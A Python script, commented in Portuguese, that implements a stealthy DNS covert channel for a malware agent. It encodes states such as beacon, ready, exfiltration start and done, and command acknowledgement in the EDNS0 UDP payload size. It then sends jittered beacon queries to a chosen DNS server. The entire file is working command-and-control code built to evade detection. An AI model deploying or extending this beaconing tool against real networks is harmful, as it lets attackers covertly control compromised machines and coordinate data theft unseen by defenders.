#!/usr/bin/env python3
"""
T4: Buffer Size Signaling
Variação do UDP Payload Size do OPT RR como side-channel.
Capacidade baixa (~11 bits/query) mas extremamente furtivo.
"""

from scapy.all import IP, UDP, send, RandShort
from scapy.layers.dns import DNS, DNSQR, DNSRROPT

import time
import random

# Mapeamento de sinais
SIGNAL_MAP = {
    'BEACON':      1232,   # Parece completamente normal
    'READY':       1337,   # Pronto para receber comando
    'EXFIL_START': 1338,   # Iniciando exfiltração
    'EXFIL_DONE':  2048,   # Exfiltração concluída
    'CMD_ACK':     4096,   # Parece normal (ACK de comando)
    'CMD_FAIL':    1452,   # Comando falhou
    'SLEEP':       1280,   # Entrando em modo sleep
}

# Mapeamento reverso
SIGNAL_DECODE = {v: k for k, v in SIGNAL_MAP.items()}


def encode_signal(state: str) -> int:
    """Codificar estado do agente no UDP Payload Size"""
    return SIGNAL_MAP.get(state, 1232)


def decode_signal(buf_size: int) -> str:
    """Decodificar sinal do buffer size"""
    return SIGNAL_DECODE.get(buf_size, f'UNKNOWN({buf_size})')


def encode_value(value: int) -> int:
    """Codificar valor numérico (0-2864) no buffer size.
    Range utilizável: 1232-4096 = 2864 valores distintos."""
    return 1232 + (value % 2865)


def decode_value(buf_size: int) -> int:
    """Decodificar valor numérico do buffer size"""
    return buf_size - 1232


def build_query(domain: str, signal: str,
                dns_server: str):
    """Construir query DNS com sinal no buffer size"""
    buf_size = encode_signal(signal)

    pkt = (
        IP(dst=dns_server) /
        UDP(dport=53, sport=RandShort()) /
        DNS(
            rd=1,
            qd=DNSQR(qname=domain, qtype='A'),
            ar=DNSRROPT(rclass=buf_size)
        )
    )
    return pkt


def send_beacon(domain: str, dns_server: str,
                interval: float = 30.0, duration: int = 600):
    """Enviar beacons periódicos via T4"""
    end_time = time.time() + duration
    count = 0

    print(f"[T4] Beacon mode: {domain} via {dns_server}, "
          f"interval={interval}s, duration={duration}s")

    while time.time() < end_time:
        signal = random.choice(['BEACON', 'READY', 'CMD_ACK'])
        pkt = build_query(f"b{count}.{domain}", signal, dns_server)
        send(pkt, verbose=0)
        count += 1

        jitter = random.uniform(-interval * 0.2, interval * 0.2)
        time.sleep(max(1.0, interval + jitter))

    print(f"[T4] Beacon concluído: {count} sinais enviados")
